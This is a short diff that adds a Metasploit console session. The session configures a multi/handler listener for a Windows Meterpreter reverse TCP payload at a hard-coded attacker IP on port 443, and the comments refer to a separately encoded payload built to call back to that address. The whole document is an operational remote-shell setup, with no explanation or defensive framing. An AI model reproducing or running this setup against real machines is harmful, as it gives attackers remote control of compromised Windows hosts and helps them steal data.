@@ -1,0 +1,12 @@
+### Set LHOST to match attacking IP address
+### Current encoded LHOST = 174.252.48.10 
+### LPORT must match the LPORT on the encoded server
+
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 
+LHOST => 174.252.48.10 
+msf exploit(handler) > set LPORT 443 
+LPORT => 443 
+msf exploit(handler) > exploit 
